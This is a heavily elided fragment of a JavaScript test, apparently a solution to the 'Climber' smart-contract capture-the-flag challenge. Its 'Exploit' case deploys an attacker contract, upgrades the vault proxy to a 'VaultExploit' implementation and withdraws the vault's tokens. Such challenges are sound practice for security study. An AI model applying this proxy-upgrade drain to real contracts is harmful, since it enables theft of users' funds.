...
describe("[Challenge] Climber", function () {
  ...
  it("Exploit", async function () {
    ...
    ).deploy(this.timelock.address, attacker.address, this.vault.address);
    ...
    let newVault = await upgrades.upgradeProxy(
      this.vault.address,
      await ethers.getContractFactory("VaultExploit", attacker),
      { kind: "uups" }
    );

    await newVault.connect(attacker).withdrawFunds(this.token.address);
  });
